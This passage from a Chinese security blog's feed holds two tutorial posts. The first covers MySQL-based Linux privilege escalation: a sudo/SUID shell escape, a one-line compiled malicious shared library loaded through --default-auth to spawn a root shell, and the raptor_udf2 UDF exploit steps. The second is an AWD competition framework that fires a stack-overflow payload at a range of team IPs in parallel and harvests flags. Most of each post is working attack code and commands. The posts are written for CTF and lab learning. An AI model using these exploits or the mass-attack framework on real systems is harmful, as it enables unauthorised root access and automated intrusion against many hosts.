    <summary type="html">&lt;h1 id=&quot;格式化字符串漏洞全面总结&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞全面总结&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞全面总结&quot;&gt;&lt;/a&gt;格式化字符串漏洞全面总结&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="格式化字符串" scheme="http://example.com/categories/PWN/PWN-ATTACK/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="格式化字符串" scheme="http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    <category term="fmtstr" scheme="http://example.com/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权2：基于mysql提权</title>
    <link href="http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2026/03/18/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%832_%E5%9F%BA%E4%BA%8Emysql%E6%8F%90%E6%9D%83/</id>
    <published>2026-03-17T16:00:00.000Z</published>
    <updated>2026-03-18T04:12:10.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql提权概念和背景"><a href="#mysql提权概念和背景" class="headerlink" title="mysql提权概念和背景"></a>mysql提权概念和背景</h1><h2 id="MySQL-概念"><a href="#MySQL-概念" class="headerlink" title="MySQL 概念"></a>MySQL 概念</h2><p>它是一个数据库软件，跑在 Linux 上，作为一个服务（进程）在后台运行。</p><p>你可以把它理解成：<br>一个专门存数据的独立程序，有自己的账号、自己的密码、自己的权限。</p><p>MySQL 在Linux也也是基于命令行操作，也有root，但和 Linux 的 root 不是一回事</p><h2 id="提权背景"><a href="#提权背景" class="headerlink" title="提权背景"></a>提权背景</h2><p>当我们拿到了低权限 Shell，并且发现系统中存在 MySQL 服务时，通常有两种典型的提权思路：</p><p>一种是基于 <code>sudo</code> 权限配置不当的“秒杀”法</p><p>另一种是经典的 UDF (用户自定义函数) 提权法。</p><h1 id="提权方法："><a href="#提权方法：" class="headerlink" title="提权方法："></a>提权方法：</h1><h2 id="命令行层面提权："><a href="#命令行层面提权：" class="headerlink" title="命令行层面提权："></a>命令行层面提权：</h2><p><strong>利用条件：</strong></p><ul><li><p>目标机存在有效的 MySQL 服务端。</p></li><li><p>当前用户可以 <code>sudo mysql</code> (用<code>sudo -l</code>看能否免密执行)，或者 <code>/usr/bin/mysql</code> 被赋予了 <code>SUID</code> 权限 (<code>chmod u+s</code>)。</p></li></ul><h3 id="一键-Shell-逃逸-可以用-的情况"><a href="#一键-Shell-逃逸-可以用-的情况" class="headerlink" title="一键 Shell 逃逸 (可以用\!的情况)"></a>一键 Shell 逃逸 (可以用<code>\!</code>的情况)</h3><p>MySQL 客户端内置了执行系统命令的功能（<code>\!</code>）。如果我们以 root 身份运行了 MySQL 客户端，直接调用 <code>/bin/sh</code> 即可。</p><p>连交互界面都不用进：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>_(如果是 SUID 权限，直接运行 <code>/usr/bin/mysql -e &#39;\! /bin/sh -p&#39;</code> 即可，注意 <code>-p</code> 参数用于保持 SUID 权限)_</p><h3 id="动态链接库劫持-用不了-或者-需要输入密码"><a href="#动态链接库劫持-用不了-或者-需要输入密码" class="headerlink" title="动态链接库劫持 (用不了\!或者 需要输入密码)"></a>动态链接库劫持 (用不了<code>\!</code>或者 需要输入密码)</h3><p>有的服务器会通过一些外部手段严禁mysql去干一些越权的事，比如说用AppArmor 或 SELinux 限制或者开了个沙箱把<code>\!</code>禁了，或者 MySQL 要求强制输入密码而你不知道密码。那我们就要采取这种方式来提权</p><p><strong>原理：</strong> MySQL 5.5 以上版本允许通过 <code>--default-auth</code> 参数指定一个外部的身份验证插件（<code>.so</code> 共享库文件）。我们可以自己写一个恶意的共享库，只要 MySQL 一加载它，就会立刻触发并弹出一个 Root Shell。这是大名鼎鼎的<code>--default-auth</code>漏洞</p><p><strong>利用：</strong></p><ul><li><p><strong>一句话编译恶意动态库：</strong> 直接在靶机终端运行，它会在当前目录生成一个 <code>lib.so</code>：</p><ul><li><p>sudo类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;__attribute__((constructor)) init() &#123; execl(&quot;/bin/sh&quot;, &quot;sh&quot;, 0); &#125;&#x27;</span> \</span><br><span class="line">    | gcc -w -fPIC -shared -o lib.so -x c -</span><br></pre></td></tr></table></figure></li><li><p>suid类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;__attribute__((constructor)) init() &#123; setuid(0); setgid(0); execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;, 0); &#125;&#x27;</span> | gcc -w -fPIC -shared -o lib.so -x c -</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>触发库文件加载：</strong> 使用 <code>--default-auth</code> 参数强行让 MySQL 去加载这个库（注意这里要用相对路径或绝对路径指向刚才生成的 <code>lib.so</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql --default-auth ./lib.so</span><br><span class="line"><span class="comment"># 或者如果是 SUID 提权：</span></span><br><span class="line">/usr/bin/mysql --default-auth ./lib.so</span><br></pre></td></tr></table></figure></li></ul><p><code>init()</code> 函数执行，拿到 Root Shell！<br>传统的 MySQL UDF（user defined function） 提权</p><hr><p><strong>利用条件：</strong></p><ol><li><p>没有 <code>sudo</code> 也没有 <code>SUID</code>，但我们<strong>拥有 MySQL root 用户的密码</strong>（比如从网站源码里翻到的）。</p></li><li><p>MySQL 服务端本身是以系统 <code>root</code> 用户身份运行的。</p></li><li><p><code>secure_file_priv</code> 为空（允许导出文件到任意目录）。</p></li></ol><p><strong>原理：</strong> UDF (用户自定义函数) 允许我们写 C 代码扩充 SQL 语句。我们把包含 <code>system()</code> 调用的恶意的 <code>.so</code> 文件传入插件目录，创建一个自定义 SQL 函数，然后用 SQL 语句执行系统命令。</p><p><img data-src="/images/ISW/Linux提权/2/查找mysql-udf的exp.png" alt="查找mysql-udf的exp"></p><p>这里选择哪个exp来打取决于靶机的linux系统号，具体用法写在1518.c注释里了（注意文件路径要和它的对应上）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">* Usage:</span><br><span class="line">* $ <span class="built_in">id</span></span><br><span class="line">* uid=500(raptor) gid=500(raptor) <span class="built_in">groups</span>=500(raptor)</span><br><span class="line">* $ gcc -g -c raptor_udf2.c</span><br><span class="line">* $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">* $ mysql -u root -p</span><br><span class="line">* Enter password:</span><br><span class="line">* [...]</span><br><span class="line">* mysql&gt; use mysql;</span><br><span class="line">* mysql&gt; create table foo(line blob);</span><br><span class="line">* mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line">* mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> * from mysql.func;</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line">* +-----------+-----+----------------+----------+</span><br><span class="line">* mysql&gt; <span class="keyword">select</span> do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line">* mysql&gt; \! sh</span><br><span class="line">* sh-2.05b$ <span class="built_in">cat</span> /tmp/out</span><br><span class="line">* uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line">* [...]</span><br><span class="line">*</span><br><span class="line">* E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line">*</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>然后把文件传到靶机就不说了</p><p><img data-src="/images/ISW/Linux提权/2/红队笔记截图.jpg" alt="红队笔记截图"></p><p>上面的面板是靶机，左下角是我们运行cat 1518.c后的主机，要注意，除了拥有mysql密码，<code>secure_file_priv</code>字段也要为空，进入mysql后第一件事就是查这个字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>后面打的顺序就按照usage来就行了</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference :"></a>reference :</h1><p><a href="https://www.bilibili.com/video/BV19s4y1D7Mt/">「红队笔记」Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例_哔哩哔哩_bilibili</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql提权概念和背景&quot;&gt;&lt;a href=&quot;#mysql提权概念和背景&quot; class=&quot;headerlink&quot; title=&quot;mysql提权概念和背景&quot;&gt;&lt;/a&gt;mysql提权概念和背景&lt;/h1&gt;&lt;h2 id=&quot;MySQL-概念&quot;&gt;&lt;a href=&quot;#MySQL</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="mysql" scheme="http://example.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻击：批量自动化攻击框架</title>
    <link href="http://example.com/2026/03/16/PWN/pwn_attack/AWD/AWD%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>http://example.com/2026/03/16/PWN/pwn_attack/AWD/AWD%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/</id>
    <published>2026-03-15T16:00:00.000Z</published>
    <updated>2026-03-14T03:09:22.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>awd时写出exp要搭配自动化工具才能稳定拿分，把exp发给全场每个靶机</p><h1 id="Bash-调度流"><a href="#Bash-调度流" class="headerlink" title="Bash 调度流"></a>Bash 调度流</h1><p>最简单粗暴的批量攻击方式是写一个 Bash 脚本。如果你的目录里有针对不同题目的多个 EXP（比如 <code>exp1.py</code>, <code>exp2.py</code>），你可以用 Bash 脚本来遍历执行它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 用法：./attack.sh &lt;目标IP&gt; &lt;端口&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> *; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$file</span> =~ ^exp.*\.py$ ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在执行 <span class="variable">$file</span> 攻击目标 <span class="variable">$1</span>:<span class="variable">$2</span>&quot;</span></span><br><span class="line">        <span class="comment"># 调用 python 执行 exp，并将 IP 和 Port 作为参数传入</span></span><br><span class="line">        python3 <span class="variable">$file</span> <span class="variable">$1</span> <span class="variable">$2</span> </span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><strong>优点</strong>：极其简单，EXP 脚本相互独立，就算某个 EXP 写崩了也不会影响其他脚本。 <strong>缺点</strong>：不支持多线程并发，打全场速度慢；无法统一管理拿到的 Flag 并自动提交。</p><h1 id="Python-高并发终极框架"><a href="#Python-高并发终极框架" class="headerlink" title="Python 高并发终极框架"></a>Python 高并发终极框架</h1><p>在真实的 AWD 现场，为了抢在别人修补漏洞之前把分拿满，我们需要<strong>多线程并发</strong>。下面是一套基于 <code>concurrent.futures</code> 线程池和 <code>requests</code> 库的“全自动打靶 + 提交”框架。</p><p>只需要在比赛现场修改两处：<strong>网络配置区</strong> 和 <strong>EXP 核心逻辑区</strong>。</p><p><strong>批量打全场自动化模板 (<code>awd_framework.py</code>)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== [1. 比赛网络配置区] ====================</span></span><br><span class="line"><span class="comment"># 这里填写的必须是官方手册明文规定的网段，绝对不要瞎填其他网段！</span></span><br><span class="line">TEAM_IP_PREFIX = <span class="string">&quot;192.168.1.&quot;</span>  <span class="comment"># 敌方队伍 IP 前缀 (如 192.168.1.x)</span></span><br><span class="line">TEAM_START = <span class="number">1</span>                 <span class="comment"># 起始队伍 ID</span></span><br><span class="line">TEAM_END = <span class="number">20</span>                  <span class="comment"># 结束队伍 ID (假设全场 20 个队)</span></span><br><span class="line">TARGET_PORT = <span class="number">8888</span>             <span class="comment"># 漏洞服务的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag 提交 API 配置 (从手册获取，或通过 F12 抓包逆向获取)</span></span><br><span class="line"><span class="comment"># 【保底机制】：如果这里留空 (&quot;&quot;)，脚本会自动将 Flag 写入同目录的 flag.txt 文件！</span></span><br><span class="line">SUBMIT_URL = <span class="string">&quot;&quot;</span> </span><br><span class="line">MY_TOKEN = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 减少 Pwntools 的日志输出，保持控制台干净，只看战况</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== [2. Flag 自动提交/本地存储逻辑] ====================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag, target_ip</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    负责将获取到的 Flag 秒速提交到比赛平台的 API，或保存在本地</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 【新增】本地保存后备方案：如果没有配置 API 或 Token，就存进同目录的 flag.txt</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> SUBMIT_URL <span class="keyword">or</span> <span class="keyword">not</span> MY_TOKEN:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;[<span class="subst">&#123;target_ip&#125;</span>] <span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+]  已保存到本地 flag.txt! 目标: <span class="subst">&#123;target_ip&#125;</span> | Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[x] 本地保存失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># API 提交逻辑</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;MY_TOKEN&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 注意：这里的 POST 请求格式(json/data/请求头)取决于具体比赛平台的 API 文档说明</span></span><br><span class="line">        res = requests.post(SUBMIT_URL, headers=headers, json=data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;true&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+]  得分! 目标: <span class="subst">&#123;target_ip&#125;</span> | Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;already&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 重复提交. 目标: <span class="subst">&#123;target_ip&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 提交失败. 目标: <span class="subst">&#123;target_ip&#125;</span> | 返回: <span class="subst">&#123;res.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[x] 提交 API 请求异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== [3. EXP 核心逻辑区 (填入你的利用代码)] ====================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">team_id</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    针对单个 IP 的攻击逻辑。</span></span><br><span class="line"><span class="string">    返回获取到的 Flag 字符串，如果失败返回 None。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    target_ip = <span class="string">f&quot;<span class="subst">&#123;TEAM_IP_PREFIX&#125;</span><span class="subst">&#123;team_id&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 强烈建议加 try-except！防止打某个队时遇到奇葩沙箱导致报错，拖垮整个线程池</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 必须设置超时时间！防止被别人故意挂起连接（万人坑）卡死脚本</span></span><br><span class="line">        io = remote(target_ip, TARGET_PORT, timeout=<span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ---------------- 你的 EXP 写在这里 ----------------</span></span><br><span class="line">        <span class="comment"># 假设这是一个非常简单的栈溢出后门题</span></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x401234</span>) </span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;name:&quot;</span>, payload)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 拿到 shell 后执行获取 flag 的命令</span></span><br><span class="line">        io.sendline(<span class="string">b&quot;cat /flag&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ---------------------------------------------------</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 接收回显并用正则表达式精准提取 Flag</span></span><br><span class="line">        output = io.recvall(timeout=<span class="number">2</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        io.close()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 假设 Flag 格式是 flag&#123;...&#125; 或者 basectf&#123;...&#125;</span></span><br><span class="line">        <span class="comment"># re.search 可以在对方故意输出的一大堆乱码防御信息中，精准抠出真 flag</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;[a-zA-Z0-9_-]+\&#125;&#x27;</span>, output) </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*]  击破 <span class="subst">&#123;target_ip&#125;</span> 获取到: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> flag, target_ip</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(f&quot;[-] &#123;target_ip&#125; 攻击成功，但在回显中未找到 Flag&quot;)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>, target_ip</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 常见的报错是 connection refused (对方服务挂了/宕机了) 或 timeout</span></span><br><span class="line">        <span class="comment"># print(f&quot;[x] &#123;target_ip&#125; 连接或攻击失败: &#123;e&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, target_ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== [4. 高并发主引擎] ====================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;======  AWD 自动化高频扫射系统启动  ======&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 ThreadPoolExecutor 开 10 个线程并发打（速度极快）</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="comment"># 将所有的攻击任务塞进线程池</span></span><br><span class="line">        futures = &#123;executor.submit(attack, tid): tid <span class="keyword">for</span> tid <span class="keyword">in</span> <span class="built_in">range</span>(TEAM_START, TEAM_END + <span class="number">1</span>)&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 只要有一个线程打完拿到了结果，立刻移交给 API 提交函数！</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            flag, ip = future.result()</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="comment"># 拿到 Flag 直接扔进提交/保存函数</span></span><br><span class="line">                submit_flag(flag, ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 实战中为了在每个 Round 持续无脑拿分，这里通常会加一个大循环：</span></span><br><span class="line">    <span class="comment"># while True:</span></span><br><span class="line">    <span class="comment">#     main()</span></span><br><span class="line">    <span class="comment">#     print(&quot;本轮扫射完毕，等待 300 秒后进入下一轮...&quot;)</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>框架核心优势解析：</strong></p><ol><li><p><strong>防卡死（Timeout 机制）</strong>：很多队伍会故意挂起你的连接。如果在 <code>remote()</code> 和 <code>recvall()</code> 里不加 <code>timeout</code> 参数，你的脚本发出去几个就会全部卡死，后面的队伍根本打不到</p></li><li><p><strong>正则提取（Regex 提取）</strong>：不用 <code>io.recvline()</code> 去拿 Flag。由于网络延迟、杂音输出甚至对方故意输出的干扰信息，你拿到的很可能不是纯净的 Flag。使用 <code>re.search(r&#39;flag\&#123;.*?\&#125;&#39;, output)</code> 是最稳的，它能在成吨的垃圾数据中把真 Flag 抠出来。</p></li><li><p><strong>静默执行（Log Level）</strong>：将 Pwntools 的日志级别设为 <code>error</code>，只打印获取成功和提交成功的信息，保证你的控制台清爽，一眼就能看到战况。</p></li></ol><p>接下来，一旦你写出了针对某个题目的 payload，你只需要把核心的那几行 <code>io.sendline()</code> 塞进上面模板的 <code>[3. EXP 核心逻辑区]</code>，然后一键运行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;awd时写出exp要搭配自动化工具才能稳定拿分，把exp发给全场每个靶机&lt;/p&gt;
&lt;h1 id=&quot;Bash-调度流&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="AWD" scheme="http://example.com/categories/PWN/PWN-ATTACK/AWD/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="awd" scheme="http://example.com/tags/awd/"/>
    
    <category term="自动化" scheme="http://example.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
